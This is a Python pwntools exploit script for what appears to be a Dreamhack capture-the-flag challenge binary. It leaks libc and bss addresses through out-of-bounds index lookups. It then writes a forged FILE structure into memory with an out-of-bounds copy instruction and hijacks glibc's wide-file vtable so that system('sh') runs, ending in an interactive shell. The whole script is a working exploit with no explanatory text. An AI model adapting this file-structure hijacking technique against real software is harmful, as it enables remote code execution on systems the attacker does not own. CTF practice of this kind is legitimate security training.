#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    elif args.REMOTE:
        r = remote("host8.dreamhack.games", 9153)

    return r

def lookup_query (p, idx):
    p.sendlineafter (b'Enter the instruction: ', b'lookup_query')
    p.sendlineafter (b'index: ', idx)

def lookup_register (p, register):
    p.sendlineafter (b'Enter the instruction: ', b'lookup_register')
    p.sendlineafter (b'register: ', register)

def mov  (p, src, des):
    p.sendlineafter (b'Enter the instruction: ', b'mov')
    p.sendlineafter (b'source register: ', src)
    p.sendlineafter (b'destination register:', des)


def main():
    p = conn()
    lookup_register (p, b'-16')
    p.recvuntil (b'contains ')
    first_half =  int (p.recvline ()[:-1].decode()) & 0xffffffff
    print ("bugg", hex (first_half))

    lookup_register (p, b'-15')
    p.recvuntil (b'contains ')
    second_half = int (p.recvline ()[:-1].decode())
    print ("bugg", hex (second_half))

    stderr_addr = second_half * (16 ** 8) + first_half

    print ("The address of _IO_2_1_stderr is:", hex (stderr_addr))
    libc.address = stderr_addr - libc.sym['_IO_2_1_stderr_']
    print ("The address of libc is:", hex (libc.address))

    lookup_query (p, b'-23')
    p.recvuntil (b'contains ')
    tmp = p.recvline()[:-1].ljust (8, b'\x00')
    print (tmp)
    reg_addr = u64 (tmp) + 0x78
    print ("The leak from bss is:", hex (reg_addr))

    fake_file = reg_addr + 0x840
    lock_file = libc.address + 0x21ba60
    one_gadget = libc.sym['system']
    print ("The address of system is:", hex (one_gadget))
    print ("The address of fake file", hex (fake_file))
    mov (p, b'0BBBBBB', b'1B' + p64 (fake_file))

    fp = FileStructure()
    fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
    fp._IO_read_end = one_gadget
    fp._lock = lock_file
    fp._wide_data = fake_file
    fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
    payload = bytes(fp) + p64(fake_file + 0x10 - 0x68)

    for i in range (0, len (payload), 8):
        mov (p, b'0BBBBBB', b'1B' + payload[i:i+8])
    
    
    lookup_register (p, b'16')
    p.recvuntil (b'contains ')
    first_half =  int (p.recvline ()[:-1].decode()) & 0xffffffff
    print ("bugg", hex (first_half))

    lookup_register (p, b'17')
    p.recvuntil (b'contains ')
    second_half = int (p.recvline ()[:-1].decode())
    print ("bugg", hex (second_half))
    chunk1 = second_half * (16 ** 8) + first_half
    print (hex (chunk1))

    cur_chunk = chunk1 + 0x110
    cur_addr = fake_file

    for i in range (31):
        src = ((cur_chunk + 0x28) - reg_addr) // 4
        des = (cur_addr - reg_addr) // 4
        mov (p, str (src).encode('utf-8'), str (des).encode('utf-8'))
        mov (p, str (src + 1).encode('utf-8'), str (des + 1).encode('utf-8'))
        cur_chunk += 0x110
        cur_addr += 0x8

    src = ((chunk1 + 0x28) - reg_addr) // 4
    des = -16
    mov (p, str (src).encode('utf-8'), str (des).encode('utf-8'))
    mov (p, str (src + 1).encode('utf-8'), str (des + 1).encode('utf-8'))

    p.sendlineafter (b'Enter the instruction: ', b'adf')

    p.interactive()


if __name__ == "__main__":
    main()
